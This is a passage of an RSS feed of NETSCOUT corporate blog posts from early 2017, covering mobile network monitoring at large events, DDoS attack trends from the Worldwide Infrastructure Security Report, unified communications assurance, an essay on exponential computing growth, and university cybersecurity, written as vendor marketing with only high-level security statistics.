  <content:encoded><![CDATA[<p>Trust may seem like an unusual word to use when discussing the relationship with your communications service provider. But trust is a vital part of a business relationship. If I am going to spend my money with a business, I trust that their products and services will do what they say they will, that they are priced reasonably, and that they will take care of me as a customer, otherwise, why am I spending my money with them?</p>

<p>We trust that our device will have connectivity to the network especially when we want it. We trust that the network will perform. And, we trust that all of the services we utilize will deliver a good user experience.</p>

<p>There are those special times, family events, a get together at a friend’s house, rock concerts, sporting events and so on, where you want to share your experiences and use your mobile device to do so. If you attended a Trump event in Washington or the Super Bowl in Houston recently, you probably spent a lot of money to be there to experience the moment, and you shared those special moments with your friends and family with a phone call, messaging, Instagram, Facebook, Twitter or other social media engagement.</p>

<p>All of the big mobile service providers, Verizon, AT&amp;T, Sprint and T-Mobile augmented their facilities (<a href="https://www.ecnmag.com/blog/2017/01/carriers-prep-big-day-dc-trump-inauguration-approaches" target="_blank">https://www.ecnmag.com/blog/2017/01/carriers-prep-big-day-dc-trump-inauguration-approaches</a>) at the Presidential inauguration to accommodate the expected flood of mobile traffic. They upgraded radio access facilities, adding temporary specialized (multi-beam and tilt) antennas, brought in mobile remote radio heads (Super Cells) and work crews, and continuously monitored the utilization and performance of their networks.</p>

<p>The stakes are simply too big for service providers to have poor network service at these high-profile events with over a hundred thousand people locally at the venues and many millions watching live on TV and on-line with video streaming applications. And, with the lightning speed and viral spread of bad experiences via social media a service provider’s brand and image can take a severe public relations hit.</p>

<p><a href="https://www.netscout.com/?ls=PR-MKTG&amp;lsd=blog-021617-1" target="_blank">NETSCOUT</a> worked with our customers to help them prepare for Super Bowl LI in Houston, February 5, 2017 as our support team for Verizon Wireless participated in a trial run last month. Like our Support team’s efforts at last year’s Super Bowl L, and at other large venue events, including both the Democratic and Republican national conventions, they configured and tested <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="a99d5947-05c5-41af-8307-5aef50a13b28" href="http://localhost:7996/product/isng-platform" title="InfiniStreamNG Application &amp; Network Monitoring Appliance">InfiniStreams</a>, Iris, <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="e0be3f25-5c8c-44ff-aa0e-e2117ed61961" href="http://localhost:7996/product/ngeniusone-platform" title="nGeniusONE Solution for Enterprise Performance Management">nGeniusONE</a> and <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="549022b1-98fc-4cec-aed0-7d3e4119baea" href="http://localhost:7996/product/truecall" title="TrueCall">TrueCall</a> to recognize all of the new and temporary mobile gear installed around NRG stadium in Houston, and set up special dashboards in nGeniusONE; creating “communities” to monitor, customized service monitors for key applications and services, and more.</p>

<p>All of this preparation helps to make our customers ready for these large scale events by bringing visibility to their networks, applications and devices, insights to the consumption of network resources and services, and user behavior, and just as importantly, secures the network from cyber threats. In this way our NETSCOUT solutions help the communications service providers create and maintain to garner trust with their customers.</p>
]]></content:encoded>
    <enclosure url="http://localhost:7996/sites/default/files/trust.jpg" length="73519" type="image/jpeg"/>
    <guid isPermaLink="false">751f7b13-272d-4a7d-9a0a-b9b561650ef2</guid>
    <pubDate>Thu, 16 Feb 2017 11:12:06 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title> History Doesn’t Repeat Itself but it Often Rhymes</title>
  <link>http://localhost:7996/blog/history-doesnt-repeat-itself-it-often-rhymes</link>
  <description>Taking a look back to the very first Worldwide Infrastructure Security Report (WISR) twelve years ago and of course, many things are vastly different. One thing is clear. Things are more complex today, from the attacks to the infrastructure, and that benefits attackers.</description>
  <content:encoded><![CDATA[<p><img alt="Mark Twain" data-entity-type="file" data-entity-uuid="992775a7-c4a5-4742-9da9-b2cae273832f" src="http://localhost:7996/sites/default/files/inline-images/mark-twain-wisr-300x300.png" style="margin-left:20px;" class="align-right" />Taking a look back to the very first Worldwide Infrastructure Security Report (WISR) twelve years ago and of course, many things are vastly different. One thing is clear. Things are more complex today, from the attacks to the infrastructure, and that benefits attackers.</p>

<p>According to WISR respondents, since 2005, DDoS attack size has grown 7,900%, for a compound annual growth rate (CAGR) of 44%. In 2005, the vast majority of attacks were basic floods. Today, multi-vector attacks are common, targeting connection bandwidth, applications and infrastructure in a single sustained attack. The big issue of the day in 2005 was Worms, a word that does not appear in the current report. Instead, it is IoT botnets that are a top of mind concern for network operators.</p>

<p>Beyond the threats, the infrastructure is more complex too. Since 2005, mobility and cloud computing have emerged and fundamentally changed everything. In attempting to deal with this complexity, some positive trends have emerged. One difference is in the quality of the tools defenders are using to protect their networks. We’re seeing increasing use of purpose built Intelligent DDoS Mitigation Systems, and less use of firewalls and IPS for DDOS protection, for example. We’re also seeing more focus on incident response practice, all positive developments.</p>

<p>Here’s a quick look why Mark Twain was such a genius,</p>

<table border="0" cellpadding="20" cellspacing="20" width="100%"><thead><tr style="background-color:#A0CE4E;color:#ffffff;"><th align="left"> </th>
			<th align="left">2005 Worldwide Infrastructure Security Report</th>
			<th align="left">2017 Worldwide Infrastructure Security Report</th>
		</tr></thead><tbody><tr style="border-bottom: 1px solid #eeeeee;"><td style="padding:10px" width="20%"><strong>Length</strong></td>
			<td style="padding:10px" width="40%">13 pages</td>
			<td style="padding:10px" width="40%">104 pages</td>
		</tr><tr style="border-bottom: 1px solid #e3e3e3;"><td style="padding:10px" width="20%"><strong>Respondents</strong></td>
			<td style="padding:10px" width="40%">36</td>
			<td style="padding:10px" width="40%">356</td>
		</tr><tr style="border-bottom: 1px solid #e3e3e3;"><td style="padding:10px" width="20%"><strong>Most Popular Attack Type</strong></td>
			<td style="padding:10px" width="40%">90% of the respondents named “brute force” attacks involving TCP SYN and UDP Floods as the most common attack vectors. A very small number of application layer attacks were observed.</td>
			<td style="padding:10px" width="40%">95% of service providers experienced application-layer attacks this year.</td>
		</tr><tr style="border-bottom: 1px solid #e3e3e3;"><td style="padding:10px" width="20%"><strong>Attack Complexity</strong></td>
			<td style="padding:10px" width="40%">Although only a handful of providers described seeing attacks more complex than basic flooding, the few attacks encountered posed a greater operational challenge.</td>
			<td style="padding:10px" width="40%">Sixty-seven percent of service providers experienced multi-vector attacks on their networks.</td>
		</tr><tr style="border-bottom: 1px solid #e3e3e3;"><td style="padding:10px" width="20%"><strong>Most Common DDoS Defense</strong></td>
			<td style="padding:10px" width="40%">Access Control Lists (ACLs)—also known as packet filters, and Border Gateway Protocol (BGP) destination-based blackhole routing remain the primary DDoS mitigation mechanism.</td>
			<td style="padding:10px" width="40%">83 percent are using intelligent DDoS mitigation systems (IDMS) to mitigate DDoS attacks.</td>
		</tr><tr style="border-bottom: 1px solid #e3e3e3;"><td style="padding:10px" width="20%"><strong>Network Congestion</strong></td>
			<td style="padding:10px" width="40%">From a network infrastructure perspective, operators say, “The primary threat from worms is not their payloads, but the network congestion they cause.”</td>
			<td style="padding:10px" width="40%">More than 60 percent saw attacks totally saturate data center bandwidth.</td>
		</tr><tr style="border-bottom: 1px solid #e3e3e3;"><td style="padding:10px" width="20%"><strong>Resources</strong></td>
			<td style="padding:10px" width="40%">Organizational and staffing issues are major barriers to implementing effective defenses against network attacks.</td>
			<td style="padding:10px" width="40%">Only 87% of service provider respondents have at least some dedicated security personnel this year — a significant drop from 95 percent last year.</td>
		</tr><tr style="border-bottom: 1px solid #e3e3e3;;"><td style="padding:10px" width="20%"><strong>Prediction</strong></td>
			<td style="padding:10px" width="40%">Application-layer attacks will increase as tools to execute these attacks become more widely available and defense techniques used to mitigate brute-force attacks lessen their impact.</td>
			<td style="padding:10px" width="40%">If current growth trends continue, the average attack size will reach nearly 1.2 Gbps by the end of 2017.</td>
		</tr><tr style="border-bottom: 1px solid #e3e3e3;"><td style="padding:10px" width="20%"><strong>Status</strong></td>
			<td style="padding:10px" width="40%">Nailed it!</td>
			<td style="padding:10px" width="40%">TBD</td>
		</tr></tbody></table><p> </p>

<p>Arbor’s 12th annual Worldwide Infrastructure Security Report delivers direct insights from network and security professionals at the world’s leading service provider, cloud/hosting and enterprise organizations. The report covers a comprehensive range of issues from threat detection and incident response to managed services, staffing and budgets. Its focus is on the operational challenges internet operators face daily from network-based threats and the strategies adopted to address and mitigate them.</p>

<p>According to Ovum Senior Analyst Rik Turner, “The WISR is always an authoritative source of data on the state of cybersecurity. The inclusion of a special section on IoT is particularly timely, however, as it’s coming onto a lot of folks’ radar as a new vector for DDoS and other types of cyberattacks.”</p>

<p><strong><a href="https://www.arbornetworks.com/report" target="_blank">DOWNLOAD</a> your copy now to learn from history and protect your future.</strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/article-security-cybersecurity-1200x480.jpg" length="276825" type="image/jpeg"/>
    <guid isPermaLink="false">66206643-b0e1-4c05-aa7d-169b9a038bc1</guid>
    <pubDate>Wed, 01 Feb 2017 16:40:25 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title> UC&amp;C: Stay Connected with Service Assurance</title>
  <link>http://localhost:7996/blog/ucc-stay-connected-service-assurance</link>
  <description>Even though most enterprises have deployed some type of unified communication and collaboration (UC&amp;C) solution, many fail to get the most from their investment. Art Schoeller, VP and principal analyst for Forrester Research, estimates that 38 percent of users are unaware of the UC&amp;C features they have, and 24 percent aren’t convinced that unified communications offers any...</description>
  <content:encoded><![CDATA[<p>Even though most enterprises have deployed some type of unified communication and collaboration (UC&amp;C) solution, many fail to get the most from their investment. Art Schoeller, VP and principal analyst for Forrester Research, estimates that 38 percent of users are unaware of the UC&amp;C features they have, and 24 percent aren’t convinced that unified communications offers any clear business benefits. Add to this the fact that more and more businesses are turning to UC&amp;C cloud services (UCaaS) rather than or in addition to premises-based solutions.</p>

<p>Every second matters in today’s connected world and business depends on UC&amp;C to compete and get the job done. Yet, whether UC&amp;C is on-prem or in the cloud, end users can experience service performance problems, and in some cases not report them to IT. That means IT teams must have unrestricted visibility into all aspects of service delivery to get ahead of performance degradations before they become business problems.</p>

<p>With businesses accelerating their speed of operation as part of their digital transformation, employees need real-time access to information and key people, to make quick decisions and deliver fast responses to customers and collaborators. The IT organization can’t afford UC&amp;C blind spots. That is especially true when things go wrong, and they do when you consider UC&amp;C is one of the more complex deployments in the enterprise, with multiple stakeholders responsible for keeping it up and running. They need a common situational awareness to reap the competitive advantages that UC&amp;C provides.</p>

<h2 data-fontsize="18" data-lineheight="27">Bringing Everyone Together</h2>

<p>ZK Research recommends taking a <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="21c02415-ff1b-4b35-b21e-d3d9c7b93394" href="http://localhost:7996/solutions/unified-communications-collaboration" title="Unified Communications and Collaboration">lifecycle approach to UC&amp;C management</a>. It starts with making sure your IT infrastructure is ready to support UC&amp;C and conducting plenty of pre-deployment service quality testing. “It is not enough for IT managers to focus on voice over IP (VoIP) alone,” says ZK. “They must subscribe to the IT lifecycle and develop a strategy that enables them to manage the availability and performance of all UC applications.”</p>

<figure class="caption caption-img align-center" role="group"><img alt="UC&amp;C" data-entity-type="file" data-entity-uuid="903c3fe1-81be-4eef-a1ec-b564a53ef650" src="http://localhost:7996/sites/default/files/inline-images/UCandC_Graphic2.jpg" /><figcaption><em>Find out why real-time, actionable intelligence is key to Digital Transformation and UC&amp;C service assurance in this <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="d7db5fa8-3e67-48ce-9b99-cc197db408cf" href="http://localhost:7996/solutions/business-assurance/table-stakes" title="Business Assurance Table Stakes">ZK Research infographic</a>.</em></figcaption></figure><p> </p>

<p>Once your solution is in production, you need ongoing service assurance. Most UC&amp;C functions are deployed across multiple servers, using different combinations of on-site and cloud resources. And everybody must “play” together: NetOps, VoiceOps and DevOps. UC&amp;C can’t work effectively when these teams are siloed, only looking at their piece of the UC&amp;C package. When this happens, invariably, the key metric for IT success becomes “mean time to innocence” rather than Mean Time to Knowledge (MTTK).</p>

<p>Service assurance also means continual optimization to get the most from your UC&amp;C investment. Optimization includes both communicating with teams about what they need from UC&amp;C and analyzing internal reporting to fine-tune the service. A senior architect from a global 500 pharmaceutical company said “In a multi-vendor environment, nGeniusONE gives the entire organization the ability to rule OUT areas and focus on the true impact. This reduces time spent in the war room and increases knowledge of end-to-end performance and end-user experience.”</p>

<h2 data-fontsize="18" data-lineheight="27">Making Unified Communications Monitoring and Analysis Easy</h2>

<p>Art Schoeller says that, according to Forrester’s research, most organizations need their UC&amp;C monitoring solution to work with multiple vendors and monitor performance and usage against a defined set of metrics. NETSCOUT solutions meet these requirements and much more. The nGeniusONE platform and nGeniusPULSE for Cloud/VoIP give you the insights you need to ensure quality and availability for voice, chat, video, web and audio conferencing, call center, and all mobile and desktop apps.</p>

<p>When it’s operating like it should, UC&amp;C technology unleashes the human potential of everyone in your business.</p>

<p><strong>Find out what <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="70e75c43-9e15-4ef8-a611-d3d08bf1763f" href="http://localhost:7996/voice-of-customer" title="Voice of The Customer">NETSCOUT customers</a> are saying about why time-sensitive, actionable intelligence is key to service assurance.</strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/UCandC.jpg" length="151348" type="image/jpeg"/>
    <guid isPermaLink="false">ac552772-7f75-4bc7-b6d4-dc6a5e47dd22</guid>
    <pubDate>Wed, 01 Feb 2017 16:25:45 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Ron Lifton</dc:creator>
    </item>
<item>
  <title>A Portent for Computing and Society</title>
  <link>http://localhost:7996/blog/portent-computing-and-society</link>
  <description>Nearly everything we do today we do with the aid of computers. Genetics are sequenced using computers, buildings are designed, demographics calculated, movies edited, music composed, phone calls made, social graphics analyzed, products ordered and delivered, etc.</description>
  <content:encoded><![CDATA[<p>Just recently I wrote an article for Venture Beat where I retold the story of the chess playing king and the traveling sage. The sage, in return for beating the king at chess, requests that the king pays his reward in rice. 1 grain on the first square of the board, 2 on the second, 4 on the fourth and then so on. After losing the king quickly discovered he could not pay his debt for on the 20th square he needed to place 1,000,000 grains of rice, on the 40th 1,000,000,000 grains of rice. And, finally on the sixty-fourth square the king would have had to put more than 18,000,000,000,000,000,000 grains of rice which are equal to about 210 billion tons of rice.</p>

<p>The point behind all of this is to start thinking about the power of exponential growth and how it is impacting our world and our future. Here is my basic hypothesis.</p>

<p>Nearly everything we do today we do with the aid of computers. Genetics are sequenced using computers, buildings are designed, demographics calculated, movies edited, music composed, phone calls made, social graphics analyzed, products ordered and delivered, etc. etc.</p>

<p>As we all know Moore’s law has proven prescient in that we have actually double compute performance approximate 2x every 18 – 24 months, without fail. This has resulted in the cost of a gigabyte of storage dropping from 500,000 dollars in the early 80’s to less than 2 cents today. This has resulted in computing which cost 1$ per instruction in the early 80’s to approximate 2 cents per million instructions today, and this is not even taking into account quantum computing or IBM’s new synaptic computer.</p>

<p>When you get to these levels of computing and you continue to double performance amazing things start to happen. First of all, you are able to carry a Star Trek communicator meets Dick Tracy watch around in your pocket. Second everything we do with computers happens faster and we produce more data which we can then analyze, producing more data and discoveries and so on.</p>

<p>This year the number one seller at Amazon was the Amazon Echo Dot. This little microphone that could, will, along with its rival Google Home, change the way we live and do so quite quickly.</p>

<p>Think about it this way. Have you ever worked with someone who was in the center of everything? A sort of hub and spoke manager? It seemed like because they spoke with everyone they had the big picture view, a real understanding of what was happening. Well, imagine now that in the center of all of these conversations are two of the most powerful computing platforms in the world, i.e. Amazon, Google. And, at the end of the line, there are millions of Dots, Echos and Google Homes, Assistants, Allos, all listening and answering millions of queries every second. You already know how much Google knows about what is going on. What will happen when its ability to collect and process information grows by 100, 1000, 10000 times?</p>

<p>Today both companies are using artificial intelligence and machine learning to process all of our queries. Google can already translate what you say into over 100 languages in real time. It understands conversational context today and will very soon learn how to unpack complex sentences. When this happens its ability to learn will move from the simple and basic queries to the reading and critical analysis of complex texts, engineering papers, medical research etc.</p>

<p>Already, today, IBM’s Watson is becoming the world’s foremost oncologist.</p>

<p>Here’s a note from IBM:<br />
<em>“Because Watson can read millions of documents in seconds, Discovery Advisor can cross-reference things like drug interaction and disease symptoms – and return not just every piece of related evidence, but visualizations that explain trends in the data, and offer hypotheses for a researcher’s query.”</em></p>

<p>In short, IBM has built what is now a physician’s most valuable research assistant. Watson is helping to create treatment protocols for cancer patients and it is doing the job more effectively than the hardest working cancer doc ever could.</p>

<p>All of this is good until it isn’t. What we are approaching here is a tipping point. In the years to come, we are going to see advances in technology and software and artificial intelligence that will make even the most fantastic science fiction future appear within reach. Why? Because we will not need to rely on a handful of smart human brains to do the calculus on how to make a safe and efficient flying car, we will have millions of smart computers working together to solve the problem.</p>

<p>I am bullish about the world that is to come. I am also cautious about whether or not we will be smart enough to build in the correct controls. The greatest shortcoming of machine intelligence is that it has been created by man.</p>

<p>Man has been created over the course of a few million years of biological evolution. What we are seeing today, in computing, is happening in months, weeks, days and soon seconds. Everything is accelerating exponentially because it is based on the exponential growth of computing.</p>

<p>We do not have the benefit of a few thousand years to make an adjustment in the sequence of evolution, it will happen in seconds, for better or for worse.</p>

<p>So keep your eyes open. Pay attention and if you are involved in building the machines, the networks, the software, think about the value of maintaining visibility. The need to monitor, record, create trends and analyze. We need to design in the controls that will allow us to recognize the trends, the risks, the pitfalls. We need to instrument everything and we need to start thinking about teaching computers human values, not rules, we already know what happens when computers blindly follow rules, iRobot, but values. The things that most of the time keep civilization civil.</p>

<p>Of course, we are not very good at agreeing on or consistently following a set group of values. I wonder if our future silicon-based assistants will be any better at it.</p>

<p><strong>You can view this story on&nbsp;<a href="http://www.computing.co.uk/ctg/opinion/3002500/exponential-growth-a-portent-for-computing-and-society" target="_blank">Computing</a>.</strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/portent.jpg" length="176012" type="image/jpeg"/>
    <guid isPermaLink="false">1713b70b-8a5f-4f18-b64d-f5639c266397</guid>
    <pubDate>Wed, 01 Feb 2017 14:28:14 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>A DDoS Attack Only Needs to Be as Large </title>
  <link>http://localhost:7996/blog/ddos-attack-only-needs-be-large</link>
  <description>As we look back over 2016, one of the most obvious stories will be the dramatic rise in the weaponization and size of DDoS attacks. At the beginning of 2016 we noted the largest attack being approximately 500Gbps. In the later months of 2016, we saw the monetization of multiple IoT-based botnet DDoS attacks that were close to breaking the 1 Tbps mark. As a marketing person...</description>
  <content:encoded><![CDATA[<p>As we look back over 2016, one of the most obvious stories will be the dramatic rise in the weaponization and size of DDoS attacks. At the beginning of 2016 we noted the largest attack being approximately 500Gbps. In the later months of 2016, we saw the&nbsp;<a href="https://www.arbornetworks.com/blog/asert/economics-propagation-mitigation-mirai/" target="_blank">monetization of multiple IoT-based botnet DDoS attacks</a>&nbsp;that were close to breaking the 1 Tbps mark.</p>

<p>As a marketing person, these eye popping numbers are great for collateral. However…the reality is, that the vast majority of DDoS attacks are much, much, smaller in size. For example, according to our 2016 ATLAS statistics 80% of all DDoS attacks are less than 1 Gbps. Odd as it may seem, this reminds me of the saying “You don’t need to be faster than the bear… just faster than your friend.”</p>

<p>So what does this have to do with the size of DDoS attacks?</p>

<p>When it comes to volumetric DDoS attacks; the DDoS attack doesn’t have to be massive to impact you. It only has to be as large as your network pipe.</p>

<p>As stated before, the vast majority of DDoS attacks are under 1 Gbps. In my experience most organizations (obviously not including service providers) have internet facing circuits that are less than 1 Gbps. Which means that they are very vulnerable to DDoS attacks.</p>

<p>Here’s another stat. According to Arbor’s 12th Annual Worldwide Infrastructure Security Report (WISR), 41% Enterprise and Gov’t institutions and 60% of data center operators reported DDoS attacks exceeding their total internet bandwidth.</p>

<p>In these scenarios, it’s an undisputable fact that the only way to protect your organization from volumetric attacks – large enough to saturate your network pipes – is to reach upstream to your ISP or a MSSP (such as&nbsp;<a href="https://www.netscout.com/product/arbor-cloud" target="_blank">Arbor Cloud</a>) for in-cloud DDoS protection.</p>

<p>And since DDoS attacks can occur without warning, automation is a key factor in defense. In fact, according to our 2017 ATLAS statistics, 90% of attacks last less than 1 hour. The faster you can detect and mitigate the less impact these attacks will have on your organization. Arbor’s on premise products such as Arbor APS or Arbor Cloud Flow Based detection, are designed to automatically detect and “cloud signal” to the&nbsp;<a href="https://www.netscout.com/ddos-protection/" target="_blank">Arbor Cloud</a>&nbsp;for mitigation of volumetric attacks.</p>

<p>So just as you only need to be faster than your friend when being attacked by a bear, a DDoS attack only needs to be as large as your internet pipe to potentially be impactful. Always on-detection and automated mitigation in the cloud are the best practices to minimize the impact of a majority of DDoS attacks.</p>

<p>To get a rare view into the most critical security challenges facing today’s network operator, download the full&nbsp;<a href="http://arbor.link/12wisrblog2" rel="nofollow" target="_blank">2017 WISR</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/article-security-ddos_attack-1200x480.jpg" length="265871" type="image/jpeg"/>
    <guid isPermaLink="false">7be7e755-1918-4071-89e3-afd91a5e855b</guid>
    <pubDate>Wed, 25 Jan 2017 17:03:03 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Tom Bienkowski</dc:creator>
    </item>
<item>
  <title>Higher Education’s Lessons on Cybersecurity</title>
  <link>http://localhost:7996/blog/higher-educations-lessons-cybersecurity</link>
  <description>As my colleague discussed back in September, one of the widest ranging threats to an educational institution’s Information infrastructure today are Distributed Denial of Service (DDoS) attacks - specifically, DDoS as a smoke screen as a diversion tactic for the invasion and exfiltration of business data. In a recent published in University Business, it was found that since 2005...</description>
  <content:encoded><![CDATA[<p>As my colleague discussed back in <a href="https://www.netscout.com/news?type=Blog" target="blank">September</a>, one of the widest ranging threats to an educational institution’s Information infrastructure today are Distributed Denial of Service (DDoS) attacks - specifically, DDoS as a smoke screen as a diversion tactic for the invasion and exfiltration of business data.</p>

<p>In a recent published in University Business, it was found that since 2005, higher education institutions have witnessed more than 500 breaches that have resulted in 13 million records stolen –the highest number of breaches of any industry sector - and&nbsp;it is a trend that’s continuing to grow.</p>

<p>Also reported in the article was a recent attack at the University of Maryland where the records of more than 300,000 people affiliated with the university were compromised. In Wisconsin, it was reported that one university was the target of between 90,000 to 100, 000 breach attempts per day by a nation-state.</p>

<p>Why are attackers targeting higher education institutions?</p>

<p>These institutions hold the personal information of employees and alumni dating back years, including birth dates, identification numbers and Social Security numbers. But even more valuable is the intellectual property universities store on their networks. Research universities are doing cutting edge work in a variety of sectors, from science and drug development to robotics and everything in between.</p>

<p>The need for collaboration and the free flow of information – the foundation of higher education - makes network security a tremendous challenge. Institutions have the daunting task of securing multiple open-networks used by different departments, off-campus facilities, students, faculty and staff.</p>

<h2>The Impact</h2>

<p>Educational institutions can be subject to fines, class action lawsuits and remediation costs in the aftermath of a successful cyberattack. Many times institutions are required to pay for forensic examinations, information call centers, and even free credit and identity monitoring to those affected. The 2015 Cost of Data Breach Study conducted by <a href="https://www.ponemon.org/news-updates/blog/security/2015-cost-of-data-breach-global.html" target="blank">Ponemon Institute</a> found that the average consolidated total cost of a data breach increased 15 percent in the last year to $3.5 million.</p>

<h2>The Solution</h2>

<p>It is clear that these attacks will continue so security needs to be at forefront of an institutions’ overall business plan. In the end, <a href="https://www.netscout.com/ddos-protection" target="blank">a comprehensive multilayer DDoS defense solution</a> that can protect network availability, it can help prevent data breaches as well by blocking outbound activity from compromised hosts.</p>

<p>It’s time higher education institutions stop being schooled on the importance of cybersecurity solutions. To see the value for yourself, <a href="https://www.netscout.com/ddos-and-security-center" target="blank">take a look how Arbor helped</a> a group of state and regional educational organizations after they experienced a series of DDoS attacks.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/2017/01/HigherEducation-12.21.16.jpg" length="226724" type="image/jpeg"/>
    <guid isPermaLink="false">cf2d02d1-ea94-466d-8754-ab7f5526f161</guid>
    <pubDate>Wed, 04 Jan 2017 14:00:22 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Jamal Bethea</dc:creator>
    </item>

  </channel>
</rss>
